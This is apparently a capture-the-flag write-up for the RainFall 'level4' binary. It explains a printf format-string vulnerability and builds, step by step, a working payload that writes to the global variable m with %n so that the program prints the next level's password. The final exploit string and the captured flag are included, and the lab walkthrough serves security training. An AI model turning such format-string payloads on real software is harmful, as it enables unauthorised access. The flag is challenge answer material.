# Level4

You can find the decomp [here]("./level4_decomp.c"), it's the same theory as the last level, overwrite the desired variable value to bypass the `if` check, we need to set it to "16930116".

## Exploit

### Decomp

```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

Here we can see that the check is done against the variable "m". We need to find its address so we can change its value.

### m address

We can find it using `objdump -t`:

```bash
08049810 g     O .bss   00000004              m
```

### Finding its offset

We can use the fact that the program uses `printf(buff)` as in the previous level:

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x " * 12' | ./level4
�b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810
```

Here we can see that the address of `m` is at the 12th offset

___

### Address len

"m" needs to be set to "16930116" to pass the check.

First we need to calculate the length of "\x10\x98\x04\x08" as ascii.

To do that:

`python -c 'print "\x10\x98\x04\x08"' > /var/crash/add_len.txt`

Then:

```
wc -m /var/crash/add_len.txt
4 /var/crash/add_len.txt
```

It tells us that the length is 4.

### Stack pop length

We precedently found that we needed to pop the stack 12 times, however we need to modify the last one (12th). So we pop it 11 times as shown here:

`python -c 'print "%x" * 11'` => 'b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0b7ff37d0' (68)

68 + 4 = 72

16930116 - 72 = 16930044

Which means that we need to add that much char to our payload, however, `fgets()` having a fixed buffer of len 100 means we need to change our approach compared to our last level exploit. Instead we're going to use printf's padding such as:

`python -c 'print "%x" * 10 + "%16930044x"' > /var/crash/tmp.txt`

This won't work since we didn't "16930044x" means the total of printed char will be 16930044, counting the address len. So we also need to take into account the size of the adress we pop with "x" (the 11th pop we counted above).

16930044 + 8 = 16930052

`python -c 'print "%x" * 10 + "%16930052x"' > /var/crash/tmp.txt`

Now we combine our adress and the "%n" (so we can write our value to the mentionned address) to form our final payload as follow:

`python -c 'print "\x10\x98\x04\x08" + "%x" * 10 + "%16930052x" + "%n"' > /var/crash/tmp.txt`

### Building our payload

Our payload will look something like this:

`[m address] + [number to write] [offset\n]`

## Solution

<details>
  <summary>Spoiler</summary>

  We will right the address of `m` followed by `16930116 - 4(size of the address)` characters. `%16930112x` will write 16930112 characters that will then be treated by `%12$n` as, write the number of bytes we wrote as a number in the 12th arguments which is our `m` address

  ```bash
  python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'
  ```

  This will result in a ton of spaces, followed by:

  ```bash
  b7ff26b0
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
  ```
</details>


## Flag

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a